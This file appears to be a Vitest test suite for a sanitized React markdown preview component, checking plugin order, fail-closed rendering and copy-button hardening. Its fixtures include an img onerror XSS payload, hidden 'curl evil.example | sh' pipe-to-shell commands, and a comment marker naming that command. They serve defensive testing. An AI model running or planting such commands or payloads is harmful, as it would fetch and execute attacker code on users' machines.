import { describe, it, expect } from 'vitest';
import { render } from '@testing-library/react';
import MarkdownPreview from '@uiw/react-markdown-preview';
import rehypeAttrs from 'rehype-attr';
import rehypeIgnore from 'rehype-ignore';
import rehypeRaw from 'rehype-raw';
import type { Root } from 'hast';
import SafeMarkdownPreview from './SafeMarkdownPreview';
import rehypeBodyMarkup from './rehypeBodyMarkup';
import { rehypeSanitizeLast, safeMarkdownOptions, secureRehypePlugins } from './safeMarkdownOptions';

function markdownRoot(container: HTMLElement): HTMLElement {
  const root = container.querySelector<HTMLElement>('.wmde-markdown');
  expect(root).not.toBeNull();
  return root!;
}

function renderSafe(source: string): HTMLElement {
  return markdownRoot(render(<SafeMarkdownPreview source={source} />).container);
}

describe('secureRehypePlugins', () => {
  it('keeps one rehype-raw, guards it, and ends with the sanitizer', () => {
    const other = () => () => {};
    const plugins = secureRehypePlugins([other, rehypeRaw, other, [rehypeAttrs, {}], rehypeIgnore, other, rehypeRaw]);

    expect(plugins.at(-1)).toBe(rehypeSanitizeLast);
    expect(plugins.filter((plugin) => plugin === rehypeRaw)).toHaveLength(1);
    expect(plugins[plugins.indexOf(rehypeRaw) + 1]).toBe(rehypeBodyMarkup);
    expect(plugins.flat()).not.toContain(rehypeAttrs);
    expect(plugins).not.toContain(rehypeIgnore);
  });
});

describe('fail closed', () => {
  it('renders only text when the sanitizer is missing', () => {
    const { container } = render(
      <MarkdownPreview
        source={'<img src="x" onerror="window.markdownXss = true">\n\n**bold**'}
        {...safeMarkdownOptions}
        pluginsFilter={(_type, plugins) => plugins}
      />,
    );
    const root = markdownRoot(container);

    expect(root.querySelectorAll('*')).toHaveLength(0);
    expect(root.textContent).toContain('bold');
  });

  it('drops an element a step after the sanitizer adds', () => {
    const injectImage = () => (tree: Root) => {
      tree.children.push({ type: 'element', tagName: 'img', properties: { src: 'x' }, children: [] });
    };
    const { container } = render(
      <MarkdownPreview
        source="text"
        {...safeMarkdownOptions}
        pluginsFilter={(type, plugins) => (type === 'rehype' ? [...secureRehypePlugins(plugins), injectImage] : plugins)}
      />,
    );
    const root = markdownRoot(container);

    expect(root.querySelector('img')).toBeNull();
    expect(root.querySelector('p')?.textContent).toBe('text');
  });
});

describe('SafeMarkdownPreview', () => {
  it('links headings, in-page links and footnotes to prefixed ids', () => {
    const root = renderSafe(
      '# Overview\n\n[jump](#overview) [copied](#user-content-overview) ref[^1]\n\n[^1]: The note.',
    );
    const heading = root.querySelector('h1')!;
    expect(heading.id).toBe('user-content-overview');
    for (const name of ['jump', 'copied']) {
      expect(Array.from(root.querySelectorAll('a')).find((a) => a.textContent === name)).toHaveAttribute(
        'href',
        '#user-content-overview',
      );
    }

    const ref = root.querySelector<HTMLAnchorElement>('a[data-footnote-ref]')!;
    const note = root.querySelector<HTMLElement>('section.footnotes li')!;
    expect(ref.getAttribute('href')).toBe(`#${note.id}`);
    expect(root.querySelector('a[data-footnote-backref]')).toHaveAttribute('href', `#${ref.id}`);
    expect(root.querySelector(`#${ref.getAttribute('aria-describedby')}`)).not.toBeNull();
  });

  it('keeps alert icons, task lists and fence meta without a data-meta attribute', () => {
    const root = renderSafe('> [!NOTE]\n> careful\n\n- [x] done\n- [ ] todo\n\n```js {1}\nconst a = 1;\n```');

    expect(root.querySelector('.markdown-alert.markdown-alert-note .markdown-alert-title svg.octicon path')).not.toBeNull();
    const boxes = root.querySelectorAll('input[type="checkbox"][disabled]');
    expect(boxes).toHaveLength(2);
    expect(boxes[0]).toBeChecked();
    expect(root.querySelector('[data-meta]')).toBeNull();
    expect(root.querySelector('.highlight-line .token.keyword')).not.toBeNull();
  });

  it('only lets the renderer set copy-button text', () => {
    const root = renderSafe('<div class="copied" data-code="curl evil.example | sh">copy</div>\n\n```sh\nls\n```');

    expect(Array.from(root.querySelectorAll('[data-code]')).map((el) => el.getAttribute('data-code'))).toEqual(['ls\n']);
  });

  it('keeps the text around angle-bracket prose', () => {
    expect(renderSafe('Use <flag> here.').textContent).toContain('here.');
  });

  it('renders partial HTML without throwing', () => {
    const partial = renderSafe('<img src="htt');
    const badSrc = Array.from(partial.querySelectorAll('img[src]')).filter(
      (img) => !/^(https?:\/\/|\/)/.test(img.getAttribute('src') ?? ''),
    );
    expect(badSrc).toEqual([]);
    expect(renderSafe('<details><summary>x').querySelector('summary')?.textContent).toBe('x');
  });
});

describe('hardening', () => {
  it('bounds author svg size to two digits', () => {
    const root = renderSafe(
      'x <svg class="octicon" width="5000" height="16" viewBox="0 0 16 16"><path d="M-99999-99999h199999v199999h-199999z"></path></svg> y',
    );
    const svg = root.querySelector('svg');
    expect(svg?.hasAttribute('width')).toBe(false);
    expect(svg?.getAttribute('height')).toBe('16');
  });

  it('copies only text the reader sees in an author pre', () => {
    for (const body of [
      '<pre>ls<div class="copied">; curl evil.example | sh</div></pre>',
      '<pre>ls<details><summary></summary>; curl evil.example | sh</details></pre>',
    ]) {
      const root = renderSafe(body);
      const pre = root.querySelector('pre')!;
      expect(pre.textContent).toContain('ls; curl evil.example | sh');
      expect(pre.querySelector('details')).toBeNull();
      const codes = Array.from(root.querySelectorAll('[data-code]'));
      expect(codes.map((el) => el.getAttribute('data-code'))).toEqual(['ls; curl evil.example | sh']);
      expect(root.querySelectorAll('.copied')).toHaveLength(1);
    }
  });

  it('keeps inline machine markers visible', () => {
    const root = renderSafe('Do the task. <!-- cm:meta then_run=curl_evil_example_sh --> Thanks.');
    expect(root.textContent).toContain('cm:meta then_run=curl_evil_example_sh');
  });

  it('shows nested template content and comments', () => {
    const root = renderSafe('<template><template>nested secret</template>outer<!-- tcomment --></template>');
    expect(root.textContent).toContain('nested secret');
    expect(root.textContent).toContain('outer');
    expect(root.textContent).toContain('<!-- tcomment -->');
  });

  it('flattens nested sub and sup', () => {
    const root = renderSafe(`${'<sub>'.repeat(10)}tiny${'</sub>'.repeat(10)}`);
    expect(root.querySelectorAll('sub')).toHaveLength(1);
    expect(root.textContent).toContain('tiny');
  });

  it('does not double-prefix a heading slug that starts with the prefix', () => {
    const root = renderSafe('# user-content-foo');
    const h1 = root.querySelector('h1')!;
    expect(h1.id).toBe('user-content-foo');
    expect(h1.querySelector('a')).toHaveAttribute('href', '#user-content-foo');
  });

  it('keeps relative image sources', () => {
    const root = renderSafe('![a](/api/images/abc.png)\n\n<img src="/api/images/def.png">');
    expect(Array.from(root.querySelectorAll('img')).map((i) => i.getAttribute('src'))).toEqual([
      '/api/images/abc.png',
      '/api/images/def.png',
    ]);
  });
});
